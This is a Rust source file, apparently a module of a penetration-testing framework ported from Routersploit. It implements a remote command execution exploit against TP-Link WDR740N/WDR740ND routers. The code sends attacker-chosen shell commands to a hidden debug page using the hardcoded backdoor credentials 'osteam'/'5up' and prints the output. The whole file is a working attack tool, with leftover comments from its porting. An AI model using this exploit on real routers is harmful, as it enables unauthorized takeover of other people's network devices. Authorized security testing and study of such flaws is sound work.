use anyhow::{Result, Context};
use colored::*;
use reqwest::Client;
use std::time::Duration;
use crate::utils::{prompt_required, normalize_target, prompt_default};
use url::form_urlencoded;

/// TP-Link WDR740ND & WDR740N Backdoor RCE
/// 
/// 1:1 Port from Routersploit (wdr740nd_wdr740n_backdoor.py)
/// Exploits a debug page that allows command execution with hardcoded credentials.
/// 
/// Target: /userRpm/DebugResultRpm.htm?cmd={cmd}&usr=osteam&passwd=5up

pub async fn run(target: &str) -> Result<()> {
    print_banner();
    
    // Determine target URL
    let raw_ip = if target.is_empty() {
        prompt_required("Target IP").await?
    } else {
        target.to_string()
    };
    let target_ip = normalize_target(&raw_ip)?;
    let base_url = format!("http://{}", target_ip);
    
    println!("{} Target: {}", "[*]".blue(), base_url);

    // Prompt for command
    let cmd = prompt_default("Command to execute", "uname -a").await?;

    let client = Client::builder()
        .danger_accept_invalid_certs(true)
        .timeout(Duration::from_secs(10))
        .build()?;
        
    println!("{} Sending exploit request...", "[*]".blue());
    
    // Construct payload with manual URL encoding for the command
    let _encoded_cmd: String = form_urlencoded::Serializer::new(String::new())
        .append_pair("cmd", &cmd)
        .finish();
        
    // Note: The serializer outputs "cmd=value", we just want the value usually or we can rely on how rust handles query params.
    // However, the python code constructs path manually: 
    // path = "/userRpm/DebugResultRpm.htm?cmd={}&usr=osteam&passwd=5up"
    // Let's do the same to be safe.
    // The `encoded_cmd` from Serializer includes "cmd=...", let's just encode usage for safety or use `urlencoding` crate if available.
    // I used `urlencoding` in previous message, let's use it here for simplicity.
    
    let path = format!(
        "{}/userRpm/DebugResultRpm.htm?cmd={}&usr=osteam&passwd=5up",
        base_url,
        urlencoding::encode(&cmd)
    );
    
    let res = client.get(&path)
        .send()
        .await
        .context("Failed to send exploit request")?;
        
    if res.status().is_success() {
        let text = res.text().await?;
        println!("{} Request successful!", "[+]".green());
        
        // Extract result via regex: var cmdResult = new Array\(\n"(.*?)",\n0,0 \);
        // We will output the whole body if regex is too complex or just search for it.
        if text.contains("cmdResult") {
            println!("{} Command Output:", "[+]".green());
            // Improved extraction simple parsing
            let start_marker = "var cmdResult = new Array(\n\"";
            let end_marker = "\",\n0,0 );";
            
            if let Some(start) = text.find(start_marker) {
                if let Some(end) = text[start..].find(end_marker) {
                    let output = &text[start + start_marker.len() .. start + end];
                    // Replace escaped newlines as done in python: .replace("\\r\\n", "\r\n")
                    let clean_output = output.replace("\\r\\n", "\n").replace("\\n", "\n");
                    println!("{}", clean_output);
                } else {
                    println!("{}", text); // fallback
                }
            } else {
                 println!("{}", text); // fallback
            }
        } else {
            println!("{} No output found in response (might be blinded or different format).", "[*]".yellow());
        }
        
    } else {
        println!("{} Request failed with status: {}", "[-]".red(), res.status());
    }
    
    Ok(())
}

fn print_banner() {
    println!("{}", "╔═══════════════════════════════════════════════════════════╗".cyan());
    println!("{}", "║    TP-Link WDR740N Backdoor (Debug Result RCE)            ║".cyan());
    println!("{}", "╚═══════════════════════════════════════════════════════════╝".cyan());
}
